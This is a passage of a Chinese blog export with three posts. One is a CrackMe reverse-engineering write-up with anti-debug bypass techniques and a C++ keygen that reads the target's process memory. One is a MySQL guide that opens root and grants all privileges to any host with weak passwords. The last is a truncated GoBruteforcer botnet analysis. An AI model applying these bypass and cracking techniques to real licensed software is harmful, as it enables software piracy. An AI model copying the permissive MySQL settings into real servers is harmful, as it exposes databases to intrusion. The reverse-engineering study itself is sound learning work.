title=\"1、分析\"></a>1、分析</h2><p>程序启动时会对Zw函数进行拷贝到自身内存中，并将内存加密。实现过掉常规API检测。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId4.png\" alt=\"document_image_rId4\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId5.png\" alt=\"document_image_rId5\"></p>\n<p>然后对<code>BeginDebug</code>和<code>ForceFlags</code>标志位进行检测，如果根据是否进行调试来设置自定义值。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId6.png\" alt=\"document_image_rId6\"></p>\n<p>执行到MFC入口后会首先判断Wow64Transition是否被hook。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId7.png\" alt=\"document_image_rId7\"></p>\n<p>然后对<code>PEB-&gt;ProcessHeap-&gt;Flags</code>、<code>PEB-&gt;ProcessHeap-&gt;ForceFlag</code>、<code>PEB-&gt;BeginDebug</code>、<code>PEB-&gt;NtGlobalFlag</code>多个标志位进行检查是否存在调试。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId8.png\" alt=\"document_image_rId8\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId9.png\" alt=\"document_image_rId9\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId10.png\" alt=\"document_image_rId10\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<p>除此之外，程序会通过解密自拷贝的Zw函数来进行反调试。</p>\n<ul>\n<li>通过设置ThreadInformation为<code>ThreadHideFromDebugger</code>，将调试器分离实现反调试。</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<ul>\n<li>通过查询调试对象来判断是否进行调试。</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<ul>\n<li>调试时默认会有一个调试对象，程序尝试创建一个调试对象后获取，如果获取不到则表明处于调试状态。</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<ul>\n<li>通过传递非法指针地址引发0xC0000005 异常，如果执行后返回的异常码不正确则表明调试器接管了异常处理，即存在调试。</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<ul>\n<li>常规API检测反调试。</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<ul>\n<li>查询系统信息</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<ul>\n<li>引发异常检测调试</li>\n</ul>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p>其中，反调试检测大多在窗口消息中。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p>包括文字的渲染。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<h2 id=\"2、反反调试\"><a href=\"#2、反反调试\" class=\"headerlink\" title=\"2、反反调试\"></a>2、反反调试</h2><h3 id=\"2-1、Patch\"><a href=\"#2-1、Patch\" class=\"headerlink\" title=\"2.1、Patch\"></a>2.1、Patch</h3><p>通过nop 反调试函数方式或者修改返回值的方式的patch实现过掉反调试。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<h3 id=\"2-2、Hook-Zw\"><a href=\"#2-2、Hook-Zw\" class=\"headerlink\" title=\"2.2、Hook Zw\"></a>2.2、Hook Zw</h3><h3 id=\"2-2-1-EAT\"><a href=\"#2-2-1-EAT\" class=\"headerlink\" title=\"2.2.1 EAT\"></a>2.2.1 EAT</h3><p>在程序启动初期，快速将ntdll.dll的导出函数进行替换后自写分发过滤。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<h3 id=\"2-2-2-替换wow64transition\"><a href=\"#2-2-2-替换wow64transition\" class=\"headerlink\" title=\"2.2.2 替换wow64transition\"></a>2.2.2 替换wow64transition</h3><p>通过ce查看32位下的syscall。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p>可以将mov edx,xxxxxx的硬编码20 8f 87 77 修改为自己的函数地址，然后通过eax的值判断函数后进行自定义处理。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p>由于CM会检测wow64transition头部是否为0xE9(默认 FF 25 xxxxxxx)</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<p>因此自定义函数的头字节不能为0xe9。但在实现后测试的环节中发现部分Zw函数调用时崩溃，原因也暂未查找，因此该方法只作为一个额外的思路。</p>\n<h1 id=\"二、注册机\"><a href=\"#二、注册机\" class=\"headerlink\" title=\"二、注册机\"></a>二、注册机</h1><h2 id=\"1、算法分析\"><a href=\"#1、算法分析\" class=\"headerlink\" title=\"1、算法分析\"></a>1、算法分析</h2><p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId36.png\" alt=\"document_image_rId36\"></p>\n<p>Win32获取EditBox函数大多是GetWindowText，但是在ida中交叉引用发现并没有什么有价值的东西。但是在导入表看到<code>OutputDebugStringA</code>,然后尝试打开了DbgView看看能不能捕获到内容。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<p>发现当用户名和注册码输入长度较长时，点击注册有输出，但该输出并非正确的注册码。猜测上层有对注册逻辑处理，交叉引用后发现上层代码无法进行伪代码生成。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n<p>简单分析后发现该段代码存在异常处理和花指令。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId39.png\" alt=\"document_image_rId39\"></p>\n<p>在异常地址0x401B86和异常函数0x0415890下断点后Shift+F9跳转到自定义异常跟踪分析后，发现该处最终的跳转结果为0x401BA1。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId40.png\" alt=\"document_image_rId40\"></p>\n<p>对代码进行修复后且nop无效代码后，ida已经可以进行伪代码生成。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId41.png\" alt=\"document_image_rId41\"></p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId42.png\" alt=\"document_image_rId42\"></p>\n<p>注册算法为从地址为0x401BA9处循环执行0x960次，每次以四字节大小读取地址数据后与初始值的Key(0x19820714)，进行异或运算得到最后一个校验值。然后生成三个固定常量表。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId43.png\" alt=\"document_image_rId43\"></p>\n<p>紧接着获取用户名和注册码对应EditBox的内容。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId44.png\" alt=\"document_image_rId44\"></p>\n<p>其中会判断用户名长度是否为8，注册码长度是否为24。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId45.png\" alt=\"document_image_rId45\"></p>\n<p>最后将用户名和上边生成的三个表、Key进行计算注册码。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId46.png\" alt=\"document_image_rId46\"></p>\n<p>计算完毕后会执行函数OutputDebugStringA将计算出来的注册码输出，但输出的方式为将计算出的注册码的头和尾字符各上升一个字符，及”0”-&gt;”1”。</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId47.png\" alt=\"document_image_rId47\"></p>\n<h2 id=\"2、注册机实现\"><a href=\"#2、注册机实现\" class=\"headerlink\" title=\"2、注册机实现\"></a>2、注册机实现</h2><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> MemTools &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE\tm_hProcess;</span><br><span class=\"line\">\tDWORD\tm_pid = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">Attach</span><span class=\"params\">(DWORD pid)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tm_pid = pid;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (m_hProcess)</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">CloseHandle</span>(m_hProcess);</span><br><span class=\"line\">\t\tm_hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\">\tT <span class=\"title\">ReadMem</span><span class=\"params\">(DWORD addr)</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!m_hProcess)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"built_in\">T</span>();</span><br><span class=\"line\">\t\tT value&#123;&#125;;</span><br><span class=\"line\">\t\t<span class=\"built_in\">ReadProcessMemory</span>(m_hProcess, (LPVOID)addr, &amp;value, <span class=\"built_in\">sizeof</span>(T), <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> key = <span class=\"number\">0x19820714</span>;</span><br><span class=\"line\">\tHWND hWnd = <span class=\"built_in\">FindWindowA</span>(<span class=\"literal\">NULL</span>,<span class=\"string\">&quot;CrackMeDemo&quot;</span>);</span><br><span class=\"line\">\tDWORD pid&#123;&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">GetWindowThreadProcessId</span>(hWnd, &amp;pid);</span><br><span class=\"line\">\tMemTools::<span class=\"built_in\">Attach</span>(pid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x960</span>; i++)</span><br><span class=\"line\">\t\tkey ^= MemTools::<span class=\"built_in\">ReadMem</span>&lt;DWORD&gt;(<span class=\"number\">0x401ba9</span> + i*<span class=\"number\">4</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> v20[<span class=\"number\">27</span>] =<span class=\"string\">&quot;0&quot;</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> v26[<span class=\"number\">27</span>] = <span class=\"string\">&quot;A&quot;</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> v18[<span class=\"number\">27</span>] = <span class=\"string\">&quot;a&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> j = <span class=\"number\">1</span>; j &lt; <span class=\"number\">26</span>; ++j)                  <span class=\"comment\">// 生成表</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tv20[j] = v20[j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tv26[j] = v26[j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tv18[j] = v18[j - <span class=\"number\">1</span>] + <span class=\"number\">1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> user[] = <span class=\"string\">&quot;test1234&quot;</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> pwd[<span class=\"number\">1024</span>]&#123;&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(user) != <span class=\"number\">8</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> k = <span class=\"number\">0</span>; k &lt; <span class=\"number\">8</span>; k++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tuser[k] ^= k;</span><br><span class=\"line\">\t\tuser[k] ^= MemTools::<span class=\"built_in\">ReadMem</span>&lt;BYTE&gt;(<span class=\"number\">0x401BB9</span> +k);</span><br><span class=\"line\">\t\tuser[k] ^= MemTools::<span class=\"built_in\">ReadMem</span>&lt;BYTE&gt;(<span class=\"number\">0x401BC9</span> +k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*(DWORD*)(user) ^= key;</span><br><span class=\"line\">\t*(DWORD*)&amp;user[<span class=\"number\">4</span>] ^= key;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> m = <span class=\"number\">0</span>; m &lt; <span class=\"number\">8</span>; m++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> __int8 v8 = (<span class=\"type\">unsigned</span> __int8)(user[m] &amp; <span class=\"number\">0xE0</span>) / <span class=\"number\">32</span>;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> __int8 v6 = (user[m] &amp; <span class=\"number\">0x1c</span>) / <span class=\"number\">4</span>;</span><br><span class=\"line\">\t\t<span class=\"type\">unsigned</span> __int8 v7 = user[m] &amp; <span class=\"number\">3</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (m % <span class=\"number\">3</span> == <span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span>] = v20[v7];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">1</span>] = v26[v8 + <span class=\"number\">8</span>];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">2</span>] = v18[v6 + <span class=\"number\">16</span>];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (m % <span class=\"number\">3</span> == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span>] = v26[v8 +<span class=\"number\">16</span>];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">1</span>] = v18[v6 + <span class=\"number\">8</span>];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">2</span>] = v20[v7];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (!(m % <span class=\"number\">3</span>))</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span>] = v26[v6 +<span class=\"number\">16</span>];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">1</span>] = v18[v7 + <span class=\"number\">8</span>];</span><br><span class=\"line\">\t\t\tpwd[m * <span class=\"number\">3</span> + <span class=\"number\">2</span>] = v20[v8];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,pwd);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId48.png\" alt=\"document_image_rId48\"></p>\n<p>DbgView捕获到的内容</p>\n<p><img src=\"/../images/Reverse/CM%E5%88%86%E6%9E%90-%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/document_image_rId49.png\" alt=\"document_image_rId49\"></p>\n<p>将头尾各降一个字符得到的内容与注册机一致。</p>\n<p>Uk4Xm30PtWj6Vl13LtRk2Xp1 -&gt; Tk4Xm30PtWj6Vl13LtRk2Xp0</p>\n","categories":["Reverse"]},{"title":"MYSQL远程连接","url":"/2024/04/21/MYSQL%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/","content":"<h1 id=\"一、连接远程数据库：\"><a href=\"#一、连接远程数据库：\" class=\"headerlink\" title=\"一、连接远程数据库：\"></a>一、连接远程<a href=\"https://cloud.tencent.com/solution/database?from=10680\">数据库</a>：</h1><h1 id=\"1、显示密码\"><a href=\"#1、显示密码\" class=\"headerlink\" title=\"1、显示密码\"></a>1、显示密码</h1><p>如：<a href=\"http://lib.csdn.net/base/14\">MySQL</a> 连接远程<a href=\"http://lib.csdn.net/base/14\">数据库</a>（192.168.5.116），端口“3306”，用户名为“root”，密码“123456”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:/&gt;mysql -h 192.168.5.116 -P 3306 -u root -p123456</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2、隐藏密码\"><a href=\"#2、隐藏密码\" class=\"headerlink\" title=\"2、隐藏密码\"></a>2、隐藏密码</h1><p>如：MySQL 连接本地数据库，用户名为“root”，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:/&gt;mysql -h localhost -u root -p  Enter password:</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"二、配置mysql允许远程链接\"><a href=\"#二、配置mysql允许远程链接\" class=\"headerlink\" title=\"二、配置mysql允许远程链接\"></a>二、配置mysql允许远程链接</h1><p>默认情况下，mysql帐号不允许从远程登陆，只能在localhost登录。本文提供了二种方法设置mysql可以通过远程主机进行连接。</p>\n<h1 id=\"一、改表法\"><a href=\"#一、改表法\" class=\"headerlink\" title=\"一、改表法\"></a>一、改表法</h1><p>在localhost登入mysql后，更改 “mysql” 数据库里的 “user” 表里的 “host” 项，将”localhost”改称”%”</p>\n<p>例如：</p>\n<p><em><strong>mysql -u root -p</strong></em></p>\n<p>Enter password:</p>\n<p>……</p>\n<p>mysql&gt;</p>\n<p>mysql&gt;<em><strong>update user set host &#x3D; ‘%’ where user &#x3D; ‘root’;</strong></em></p>\n<p>mysql&gt;<em><strong>select host, user from user;</strong></em></p>\n<h1 id=\"二、授权法\"><a href=\"#二、授权法\" class=\"headerlink\" title=\"二、授权法\"></a>二、授权法</h1><p>例如： 你想myuser使用mypassword（密码）从任何主机连接到mysql<a href=\"https://cloud.tencent.com/product/cvm?from=10680\">服务器</a>的话。</p>\n<p>mysql&gt;<em><strong>GRANT ALL PRIVILEGES ON *.* TO ‘myuser‘@’%’IDENTIFIED BY ‘mypassword’ WITH GRANT OPTION;</strong></em></p>\n<p>如果你想允许用户myuser从ip为192.168.1.6的主机连接到mysql服务器，并使用mypassword作为密码 。</p>\n<p>mysql&gt;<em><strong>GRANT ALL PRIVILEGES ON *.* TO ‘myuser‘@’192.168.1.3’IDENTIFIED BY ‘mypassword’ WITH GRANT OPTION;</strong></em></p>\n<p>mysql&gt;<em><strong>FLUSH PRIVILEGES</strong></em></p>\n<p>使修改生效，就可以了 。</p>\n<h1 id=\"常见问题：\"><a href=\"#常见问题：\" class=\"headerlink\" title=\"常见问题：\"></a>常见问题：</h1><p>1、在采用法二授权法之后，无法在本地登录mysql（如：#mysql -u root -p -h 192.168.5.116 Enter password:  ERROR 1045 (28000): Access denied for user ‘root‘@’loadb116’ (using password: YES) 上例中loadb116是主机名.</p>\n<p>解决方法：</p>\n<p>1、这时可以使用：mysql  -u root -p 登录，进入到mysql后。</p>\n<p>mysql&gt;grant all privileges on <em>.</em> to ‘root‘@’loadb116’ identified by ‘123456’ with grant option;</p>\n<p>Query OK, 0 rows affected (0.00 sec)</p>\n<p>mysql&gt; flush privileges;</p>\n<p>Query OK, 0 rows affected (0.00 sec)</p>\n<p>2、在本地使用ip地址登录</p>\n<h1 id=\"mysql-u-root-p-h-192-168-5-116\"><a href=\"#mysql-u-root-p-h-192-168-5-116\" class=\"headerlink\" title=\"mysql -u root -p -h 192.168.5.116\"></a>mysql -u root -p -h 192.168.5.116</h1><p>Enter password:</p>\n<p>Welcome to the MySQL monitor.  Commands end with ; or &#x2F;g. Your MySQL connection id is 60 Server version: 5.1.45 MySQL Community Server (GPL) Type ‘help;’ or ‘&#x2F;h’ for help. Type ‘&#x2F;c’ to clear the buffer.</p>\n<p>mysql&gt;</p>\n","categories":["Usual"]},{"title":"GoBruteforcer僵尸网络样本分析","url":"/2024/04/21/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/","content":"<h1 id=\"一、样本标签\"><a href=\"#一、样本标签\" class=\"headerlink\" title=\"一、样本标签\"></a>一、样本标签</h1><table>\n<thead>\n<tr>\n<th>标签名</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>原始⽂件名</td>\n<td>cache_init</td>\n</tr>\n<tr>\n<td>MD5</td>\n<td>8F56AEB3D516E6DEB858A73DA66E1071</td>\n</tr>\n<tr>\n<td>⽂件⼤⼩</td>\n<td>1.63 MB (1,711,852 字节)</td>\n</tr>\n<tr>\n<td>⽂件格式</td>\n<td>ELF 86-bit</td>\n</tr>\n<tr>\n<td>加壳类型</td>\n<td>UPX</td>\n</tr>\n<tr>\n<td>编译语⾔</td>\n<td>GO</td>\n</tr>\n<tr>\n<td>SHA-1</td>\n<td>7510E1914343B7EE91BC6BFC97951ECA7B4B7F16</td>\n</tr>\n<tr>\n<td>SHA-256</td>\n<td>7c27ac0daba19de227fcc467abfcdefa99426c768a3601b1b181e9741717665b</td>\n</tr>\n<tr>\n<td>开源报告</td>\n<td><a href=\"https://unit42.paloaltonetworks.com/gobruteforcer-golang-botnet/\">https://unit42.paloaltonetworks.com/gobruteforcer-golang-botnet/</a></td>\n</tr>\n</tbody></table>\n<h1 id=\"二、详细分析\"><a href=\"#二、详细分析\" class=\"headerlink\" title=\"二、详细分析\"></a>二、详细分析</h1><h2 id=\"1、样本分析\"><a href=\"#1、样本分析\" class=\"headerlink\" title=\"1、样本分析\"></a>1、样本分析</h2><p>样本(8F56AEB3D516E6DEB858A73DA66E1071)运行后随机选择一个无类域间路由([CIDR](<a href=\"https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#:~:text=CIDR\">https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing#:~:text=CIDR</a> is also used for,of bits in the address.))块在攻击期间扫描网络，它针对该 CIDR 范围内的所有 IP 地址。威胁行为者选择 CIDR 块扫描作为访问网络中不同 IP 上的各种目标主机的一种方式，而不是使用单个 IP 地址作为目标。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317121901733.png\" alt=\"image-20230317121901733\"></p>\n<p>一旦找到主机，样本就会通过读取自身预存的凭据对<code>phpmyadmin</code>、<code>mysql</code>、<code>ftp</code>、<code>postgre</code>服务进行暴力破解。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317122019559.png\" alt=\"image-20230317122019559\"></p>\n<p>一旦暴力破解成功，则会将破解到的user:pwd绑定到攻击者服务器的远程shell(45172413e29114dc3820d7e5e2b08b4b)。</p>\n<p><img src=\"/../images/Virus/GoBruteforcer%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20230317141606134.png\" 